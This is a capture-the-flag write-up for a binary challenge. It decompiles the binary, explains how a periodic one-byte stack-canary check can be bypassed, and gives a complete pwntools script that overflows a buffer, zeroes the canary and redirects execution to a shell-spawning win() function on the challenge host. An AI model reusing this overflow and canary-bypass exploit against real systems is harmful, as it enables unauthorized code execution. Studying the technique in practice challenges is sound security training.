# Analyzing the binary # 

## checksec ## 

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

## source code ##

Loading up the `chall` binary in ghidra, we see the following functions: 

The **main()** function seems to do an infinite loop, allowing us to either exit completely or call the **submit_code()** function. 

```c
undefined8 main(void)
{
  bool bVar1;
  int iVar2;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  bVar1 = true;
  while (bVar1) {
    menu();
    fgets(local_38,0x20,stdin);
    iVar2 = atoi(local_38);
    if (iVar2 == 1) {
      submit_code();
    }
    else if (iVar2 == 2) {
      bVar1 = false;
    }
  }
  DuckCounter = DuckCounter + 1;
  if ((DuckCounter & 0x1f) == 0x1e) {
    if ((char)*(undefined8 *)(in_FS_OFFSET + 0x28) != (char)local_10) goto LAB_0040137c;
  }
  else if (*(long *)(in_FS_OFFSET + 0x28) != local_10) {
LAB_0040137c:
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Next is the **submit_code()** function. Every time this function is called, it increases a global counter called `DuckCounter`. For some reason, this function has two different paths for the stack cookie check.

```c

void submit_code(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Please enter your code. Elon will review it for length.\n");
  fgets(local_218,0x228,stdin);
  DuckCounter = DuckCounter + 1;
  if ((DuckCounter & 0x1f) == 0x1e) {
    if ((char)*(undefined8 *)(in_FS_OFFSET + 0x28) != (char)local_10) goto LAB_00401209;
  }
  else if (*(long *)(in_FS_OFFSET + 0x28) != local_10) {
LAB_00401209:
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Lastly, we notice that there is a **win()** function that simply drops us into a shell. 

```c
void win(void)
{
  system("/bin/sh");
  return;
}
```

# Exploitation #

Its safe to assume from the naming of this challenge that we can somehow bypass the stack cookie check and overwrite saved rip on the stack with the address of win(). 

We noticed that in **submit_code()** there were two different cookie checks. Let's look at those a little bit closer. 

Normally, the following cookie check is done: 

```c
(*(long *)(in_FS_OFFSET + 0x28) != local_10)
```

However, when the following condition is met:

```c
((DuckCounter & 0x1f) == 0x1e)
```

We instead use the other check: 

```c
((char)*(undefined8 *)(in_FS_OFFSET + 0x28) != (char)local_10)
```

In other words: if DuckCounter equals 30 (or 0x1e), we execute the last check. 

Notice that the second check casts the stack cookie to a char, and the first check casts it to a long. 

The 'bug' here is that when casting the stack cookie to just a char, it will only use the least significant byte instead of the full 8 bytes. 

Stack cookies conveniently always end with a nullbyte, which means that this second check only checks the last nullbyte. 

Therefore, we should be able to bypass the stack cookie check by:
- calling **submit_code()** 29 times
- calling **submit_code()** overflowing the long local_10;, overwriting the stack cookie with all nullbytes, bypassing the stack cookie check and then overwrite saved rip with the address of **win()**

# Exploit # 

```python
#!/usr/bin/env python3 
from pwn import *

r = process("./chall")
r = remote("pwn.chall.pwnoh.io", 13386)
e = ELF("./chall")

# call submit_code 29 times
for i in range(0, 29):
    r.sendlineafter(b"2. Get fired\n", b"1")
    r.sendlineafter(b"length.\n", b"AAAA")
    #r.interactive()

pause()
r.sendlineafter(b"2. Get fired\n", b"1")

ret = ROP(e).find_gadget(["ret"]).address
payload = b"A"*520 + b"\x00" * 8 + b"C" * 8 + p64(ret) + p64(e.symbols['win'])
r.sendlineafter(b"length.\n", payload)

r.interactive()
```